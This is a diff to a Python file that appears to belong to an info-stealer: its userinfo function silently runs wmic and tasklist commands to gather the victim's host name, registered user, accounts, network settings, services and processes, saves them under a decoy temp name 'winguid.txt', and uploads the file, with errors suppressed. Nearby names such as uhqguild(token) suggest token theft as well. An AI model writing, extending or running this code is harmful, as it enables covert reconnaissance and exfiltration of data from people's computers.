@@ -699,61 +699,65 @@ def getaut(path, arg):
 
 
 def userinfo():
-    def execute_command(command):
-        try:
-            with subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True) as process:
-                result = process.communicate()
-                output = result[0]
-                if process.returncode != 0:
-                    output += f"\nError: {result[1]}"
-                return output
-        except Exception as e:
-            return str(e)
+    try:
+        def execute_command(command):
+            try:
+                with subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True) as process:
+                    result = process.communicate()
+                    output = result[0]
+                    if process.returncode != 0:
+                        output += f"\nError: {result[1]}"
+                    return output
+            except Exception as e:
+                return str(e)
 
-    commands = [
-        'wmic os get csname, description, installdate, organization, registereduser, numberofprocesses',
-        'wmic os get lastbootuptime, localdatetime, oslanguage, version',
-        'wmic qfe get',
-        'wmic startup get',
-        'wmic nic get',
-        'wmic netclient get',
-        'wmic netlogin get',
-        'wmic netprotocol get',
-        'wmic nicconfig get',
-        'wmic netuse get',
-        'wmic os get /format:list',
-        'wmic logicaldisk get caption, description, size, filesystem',
-        'wmic diskdrive get caption, size, mediatype',
-        'wmic cpu get caption, deviceid, maxclockspeed, numberofcores',
-        'wmic memorychip get capacity, devicelocator, speed',
-        'wmic bios get manufacturer, version, releasedate',
-        'wmic service get name, startname, state',
-        'wmic useraccount get name, domain, disabled',
-        'wmic process list brief',
-        'wmic printer get name, portname, drivername',
-        'tasklist'
-    ]
+        commands = [
+            'wmic os get csname, description, installdate, organization, registereduser, numberofprocesses',
+            'wmic os get lastbootuptime, localdatetime, oslanguage, version',
+            'wmic qfe get',
+            'wmic startup get',
+            'wmic nic get',
+            'wmic netclient get',
+            'wmic netlogin get',
+            'wmic netprotocol get',
+            'wmic nicconfig get',
+            'wmic netuse get',
+            'wmic os get /format:list',
+            'wmic logicaldisk get caption, description, size, filesystem',
+            'wmic diskdrive get caption, size, mediatype',
+            'wmic cpu get caption, deviceid, maxclockspeed, numberofcores',
+            'wmic memorychip get capacity, devicelocator, speed',
+            'wmic bios get manufacturer, version, releasedate',
+            'wmic service get name, startname, state',
+            'wmic useraccount get name, domain, disabled',
+            'wmic process list brief',
+            'wmic printer get name, portname, drivername',
+            'tasklist'
+        ]
 
-    output_file_path = os.getenv("TEMP") + f"\winguid.txt"
+        output_file_path = os.getenv("TEMP") + f"\winguid.txt"
 
-    with open(output_file_path, 'w') as f:
-        f.write('')
-    def write_to_file(command, output):
-        with open(output_file_path, "a") as f:
-            f.write(f"Command: {command}\n")
-            f.write(f"Output:\n{output}\n\n")
+        with open(output_file_path, 'w') as f:
+            f.write('')
+        def write_to_file(command, output):
+            with open(output_file_path, "a") as f:
+                f.write(f"Command: {command}\n")
+                f.write(f"Output:\n{output}\n\n")
 
-    for command in commands:
-        output = execute_command(command)
-        write_to_file(command, output)
+        for command in commands:
+            try:
+                output = execute_command(command)
+                write_to_file(command, output)
+            except: pass
+        with open(output_file_path, "r") as f:
+            lines = [line.replace('\t', '    ') for line in f]
 
-    with open(output_file_path, "r") as f:
-        lines = [line.replace('\t', '    ') for line in f]
-
-    with open(output_file_path, "w") as f:
-        f.writelines(lines)
-        
-    return upload_file(output_file_path)
+        with open(output_file_path, "w") as f:
+            f.writelines(lines)
+            
+        return upload_file(output_file_path)
+    except:
+        pass
 
 
 def uhqguild(token):
